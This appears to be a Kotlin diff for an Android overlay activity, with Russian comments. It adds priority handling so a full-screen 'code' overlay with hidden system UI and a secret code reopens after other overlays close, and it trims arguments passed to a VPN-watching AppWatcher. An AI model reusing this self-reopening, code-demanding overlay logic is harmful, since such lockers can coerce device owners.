@@ -117,6 +117,14 @@ class OverlayActivity : Activity() {
         buildUI()
         applyIntent(intent)
         hideSystemUI()
+
+        // Регистрируем приоритет
+        val priority = when (mode) {
+            "code"  -> PRIORITY_CODE
+            "video" -> PRIORITY_VIDEO
+            else    -> PRIORITY_MSG
+        }
+        OverlayPriorityManager.setActive(priority)
     }
  
     override fun onNewIntent(intent: Intent?) {
@@ -169,6 +177,13 @@ class OverlayActivity : Activity() {
     override fun onDestroy() {
         handler.removeCallbacksAndMessages(null)
         unregisterCodeReceiver()
+        // Снимаем приоритет — если было done (закрыли на ОК/код), может всплыть code
+        val priority = when (mode) {
+            "code"  -> PRIORITY_CODE
+            "video" -> PRIORITY_VIDEO
+            else    -> PRIORITY_MSG
+        }
+        OverlayPriorityManager.clearActive(priority)
         super.onDestroy()
     }
  
@@ -230,6 +245,12 @@ class OverlayActivity : Activity() {
         done             = false
         codeWaitingConfirm = false
         applyMode()
+        // Если это code — регистрируем себя для возврата после msg/video
+        if (mode == "code") {
+            OverlayPriorityManager.scheduleCodeReopen(
+                applicationContext, originalText, uploadChatId, codeSecret, allowMedia
+            )
+        }
     }
  
     private fun applyMode() {
@@ -484,10 +505,6 @@ class OverlayActivity : Activity() {
             AppWatcher.start(
                 context       = applicationContext,
                 vpnPackage    = pkg,
-                message       = originalText,
-                chatId        = uploadChatId,
-                secret        = codeSecret,
-                allowMedia    = allowMedia,
             )
         }
         removeFeedbackScreen()
@@ -553,10 +570,6 @@ class OverlayActivity : Activity() {
             AppWatcher.start(
                 context    = applicationContext,
                 vpnPackage = "",
-                message    = originalText,
-                chatId     = uploadChatId,
-                secret     = codeSecret,
-                allowMedia = allowMedia,
             )
         }
         removeFeedbackScreen()
